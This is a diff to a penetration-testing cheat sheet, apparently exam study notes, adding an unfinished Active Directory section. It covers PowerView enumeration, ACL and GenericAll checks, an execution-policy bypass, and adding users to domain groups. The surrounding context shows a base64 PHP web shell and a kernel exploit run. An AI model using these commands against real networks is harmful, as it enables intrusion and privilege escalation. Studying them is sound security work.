@@ -6,7 +6,8 @@
 - [Web application attack](#web-application-attack)
 - [Password attack](#password-attack)
 - [Windows priviledge](#windows-priviledge)
-- [Linux priviledge](#linux-priviledge)  
+- [Linux priviledge](#linux-priviledge)
+- [Active Directory](#active-directory) 
 - [Public exploit](#Public-exploit)  
 - [Port tunneling and port redirection](#port-tunneling-and-port-redirection)
 - [Check/kill ports and containers](#checkkill-ports-and-containers)
@@ -1026,6 +1027,87 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
     `joe@ubuntu-privesc:~$ ./cve-2017-16995`  
 
 # Active directory  
+Login to DC  
+- Local user: hostname\username  
+- Domain user: DOMAIN\username  
+- `xfreerdp3 /u:<user> /p:'<password>' /d:<corp.com> /v:<target> /cert:ignore /drive:share,/home/kali/share`  #domain user
+
+**Enumeration**
+- Manual enumeration
+  ```
+  #user
+  C:\Users\stephanie>net user jeffadmin /domain  #password policy and groups
+   
+  #users
+  C:\Users\stephanie>net user /domain
+
+  #group
+  PS C:\Tools> net group "Sales Department" /domain
+  
+  #groups
+  C:\Users\stephanie>net group /domain  
+  ```
+- 🖥️**Automated script - PowerView.ps1**
+  - ❗ `powershell -ep bypass`
+  - Import PowerView to memory
+    `PS C:\Tools> Import-Module .\PowerView.ps1`  
+  - Users, groups, computer  
+    ```
+    #domain info
+    Get-NetDomain
+
+    #users
+    Get-NetUser | select cn, samaccountname, name, memberof, pwdlastset, lastlogon, description, useraccountcontrol
+
+    #user
+    Get-NetUser <username> | select cn, samaccountname, name, memberof, pwdlastset, lastlogon, description, useraccountcontrol
+
+    #SPN
+    Get-NetUser -SPN | select samaccountname,serviceprincipalname
+
+    #groups
+    Get-NetGroup | select cn, name, samaccountname, description, memberof, distinguishedname
+    
+    #group
+    Get-NetGroup "Sales Department" | select member
+
+    #computer
+    Get-NetComputer | select operatingsystem,operatingsystemversion,dnshostname
+
+    #object permission
+    Get-ObjectAcl -Identity <username>
+    PS C:\Tools> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104  #objectSID
+    PS C:\Tools> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-553 #SecurityIdentifer
+
+    #list all permissions for the group  
+    Get-ObjectAcl -Identity "Management Department" | Select-Object @{n='Identity';e={($_.SecurityIdentifier | Convert-SidToName)}}, ActiveDirectoryRights, AccessControlType   
+
+    #List "GenericAll" permissions on the group
+    Get-ObjectAcl -Identity "Management Department" | Where-Object {$_.ActiveDirectoryRights -eq "GenericAll"} | Select-Object @{n='Identity';e={($_.SecurityIdentifier | Convert-SidToName)}}, ActiveDirectoryRights
+
+    #Domain shares
+    Find-DomainShare
+    ```
+  - ❗**Permissions and logged on Users**
+    - enumerate all machines in the domain and check current user has local admin rights
+      `Find-LocalAdminAccess`
+    - ACL
+      `Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl`  
+  - check any logged on users
+    `Get-NetSession -ComputerName files04 -Verbose`
+    `PS C:\Tools\PSTools> .\PsLoggedon.exe \\files04`  
+- Service Principal Names (SPNs)
+  `setspn -L <iis_service>`  #list all Service Principal Names (SPNs) associated with a user or service account
+- add new user to domain group
+  `net group "Management Department" stephanie /add /domain`
+  `net group "Management Department" stephanie /del /domain`
+- Domain Shares
+  ``
+- BloodHound & SharpHound
+
+# Lateral movement  
+- Login to DC
+- ddd
 
 # Port tunneling and port redirection
 - Tutotial
